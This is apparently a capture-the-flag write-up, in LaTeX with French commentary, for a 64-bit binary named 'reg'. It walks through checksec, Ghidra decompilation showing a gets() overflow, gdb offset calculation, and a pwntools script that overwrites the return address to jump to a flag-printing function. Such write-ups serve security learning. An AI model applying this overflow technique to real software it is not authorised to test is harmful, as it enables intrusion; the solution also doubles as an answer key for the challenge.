\chapter{Reg}
\begin{itemize}
    \item {\bf technics}: ret2win 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}

\section{Recon}
\subsection{File info}
\begin{verbatim}
$ file reg
reg: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
    interpreter /lib64/ld-linux-x86-64.so.2, 
    BuildID[sha1]=134349a67c90466b7ce51c67c21834272e92bdbf, for GNU/Linux 3.2.0,
    not stripped
\end{verbatim}

\subsection{Security}
\begin{verbatim}
$ pwntools-pwn checksec --file=reg
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
\end{verbatim}

\subsection{Execution}


\section{static analysis}

avec ghidra on a :
\begin{verbatim}
void run(void)
{
  char local_38 [48];

  initialize();
  printf("Enter your name : ");
  gets(local_38);
  puts("Registered!");
  return;
}

void winner(void)
{
  char local_418 [1032];
  FILE *local_10;
  
  puts("Congratulations!");
  local_10 = fopen("flag.txt","r");
  fgets(local_418,0x400,local_10);
  puts(local_418);
  fclose(local_10);
  return;
}


undefined8 main(void)
{
  run();
  return 0;
}

\end{verbatim}

cela signifie qu'il suffit juste de sauter à winner.


\section{dynamic analysis}

\subsection{breakpoints}

\begin{itemize}
    \item \verb+b run+
    \item \verb-b *run+52- retour de gets
\end{itemize}

winner se trouve en \verb+0x0000000000401206+

\begin{verbatim}
gef>  i f
Stack level 0, frame at 0x7fffffffc0a0:
 rip = 0x40126e in run; saved rip = 0x4012bb
 called by frame at 0x7fffffffc0b0
 Arglist at 0x7fffffffc090, args:
 Locals at 0x7fffffffc090, Previous frame's sp is 0x7fffffffc0a0
 Saved registers:
  rbp at 0x7fffffffc090, rip at 0x7fffffffc098
\end{verbatim}

\begin{verbatim}
gef>  search-pattern AAAA
[+] Searching 'AAAA' in memory
[+] In '[stack]'(0x7ffffffdc000-0x7ffffffff000), permission=rw-
  0x7fffffffc060 - 0x7fffffffc064  →   "AAAA"
  \end{verbatim}

calcul de la taille du payload
\begin{verbatim}
$ echo 'ibase=16;98-60' |bc
56
\end{verbatim}

validation si on imput un cyclic de 60 et qu'au retour de la fonction gets on
fait un info frame on obtient la valeur \verb+0x6161616f+ dans saved rip donc
\verb+oaaa+ donc 56.
\begin{verbatim}
...SNIP...
gef>  i f
Stack level 0, frame at 0x7fffffffc0a0:
 rip = 0x40129e in run; saved rip = 0x6161616f
 called by frame at 0x7fffffffc0a8
 Arglist at 0x7fffffffc090, args:
 Locals at 0x7fffffffc090, Previous frame's sp is 0x7fffffffc0a0
 Saved registers:
  rbp at 0x7fffffffc090, rip at 0x7fffffffc098
\end{verbatim}



\subsection{Exploit build}

\begin{verbatim}
$ pwntools-pwn template --host 10.10.10.10 --port 10 ./reg > pwn-reg.py
\end{verbatim}

\begin{verbatim}
io = start()
winner_addr = b'0x401206'
payload = flat(
        [
           (b'A' * 56),
            int(winner_addr.decode(),16),
        ]
)
log.info(io.clean())
io.sendline(payload)

\end{verbatim}
